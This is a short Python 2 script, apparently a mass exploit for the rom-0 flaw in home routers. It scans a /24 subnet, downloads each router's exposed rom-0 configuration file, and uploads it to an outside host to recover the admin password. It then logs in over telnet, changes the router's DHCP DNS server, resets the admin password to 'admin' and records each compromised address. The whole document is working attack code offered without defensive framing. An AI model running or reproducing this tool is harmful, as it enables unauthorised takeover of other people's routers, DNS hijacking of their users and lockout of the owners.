#!/usr/bin/python
from netaddr import IPNetwork
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import os
import urllib
import urllib2
import re
import getpass
import sys
import telnetlib
import time
import socket


def main():
    r = IPNetwork(sys.argv[1] + "/24")
    register = open('register.txt', 'w')
    for ip in r:
        socket.setdefaulttimeout(4)
        register_openers()
        try:
            os.remove('rom-0')
        except:
            pass
        try:
            host = str(ip)
            urllib.urlretrieve("http://" + host + "/rom-0", "rom-0")
            datagen, headers = multipart_encode(
                {"uploadedfile": open("rom-0")})
            request = urllib2.Request(
                "http://50.57.229.26/decoded.php", datagen, headers)
            str1 = urllib2.urlopen(request).read()
            m = re.search('rows=10>(.*)', str1)
            if m:
                    found = m.group(1)
            tn = telnetlib.Telnet(host, 23, 3)
            tn.read_until("Password: ")
            tn.write(found + "\n")
            tn.write("set lan dhcpdns 8.8.8.8\n")
            tn.write("sys password admin\n")
            register.write(host)
            print host + " -> Success"
            tn.write("exit\n")
        except:
            print host + " -> Offline!"
    register.close()

if __name__ == "__main__":
    main()
